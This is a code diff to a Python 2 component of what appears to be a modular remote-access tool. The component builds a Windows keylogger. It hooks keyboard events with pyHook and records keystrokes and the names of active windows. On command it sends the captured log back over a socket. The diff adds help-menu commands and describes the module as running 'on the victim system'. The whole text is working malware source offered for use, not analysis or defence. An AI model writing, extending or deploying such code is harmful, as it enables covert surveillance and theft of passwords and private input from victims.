@@ -12,7 +12,7 @@ def main(option):
         config.import_statements.append('from ctypes import windll')
         config.global_vars.append('keylog = ""')
         config.global_vars.append('window = ""')
-        config.global_vars.append('active = False')
+        config.global_vars.append('active_logger = False')
         config.functions.append('''
 def OnKeyboardEvent(event):
     global window
@@ -32,29 +32,29 @@ def OnKeyboardEvent(event):
     return True
 
 def key(option):
-    global active
+    global active_logger
     global keylog
     if option == 'key_start':
-        if active:
+        if active_logger:
             s.sendall('[-]Keylogger already started')
         else:
             hooks_manager = pyHook.HookManager()
             hooks_manager.KeyDown = OnKeyboardEvent
             hooks_manager.HookKeyboard()
-            active = not active
+            active_logger = not active_logger
             s.sendall('[+]Activated keylogger')
             while True:
-                if not active:
+                if not active_logger:
                     hooks_manager.UnhookKeyboard()
                     windll.user32.PostQuitMessage(0)
                     return
                 else:
                     pythoncom.PumpWaitingMessages()
     elif option == 'key_stop':
-        if not active:
+        if not active_logger:
             s.sendall('[-]Keylogger not started')
         else:
-            active = not active
+            active_logger = not active_logger
             s.sendall('[+]Stopped keylogger')
     elif option == 'key_dump':
         s.sendall('[+]Keylog dump : \\n' + keylog + '\\n')
@@ -63,9 +63,12 @@ def key(option):
             elif command in ('key_start','key_stop','key_dump'):
                 t = threading.Thread(target=key, args=(data,))
                 t.start()''')
+        config.help_menu['key_start'] = 'Start the keylogger'
+        config.help_menu['key_stop'] = 'Stop the keylogger'
+        config.help_menu['key_dump'] = 'Dump the captured in-memory keystrokes'
     elif option == 'info':
-        print '\nName             : Keylogger component' \
+        print '\nName             : Keylogger and window logger component' \
               '\nOS               : Windows' \
               '\nRequired Modules : PyHook (External), pythoncom (External), threading, ctypes' \
               '\nCommands         : key_start, key_stop, key_dump' \
-              '\nDescription      : Runs a keylogger on the victim system which logs in-memory, to view the log run the key_dump command\n'
+              '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n'
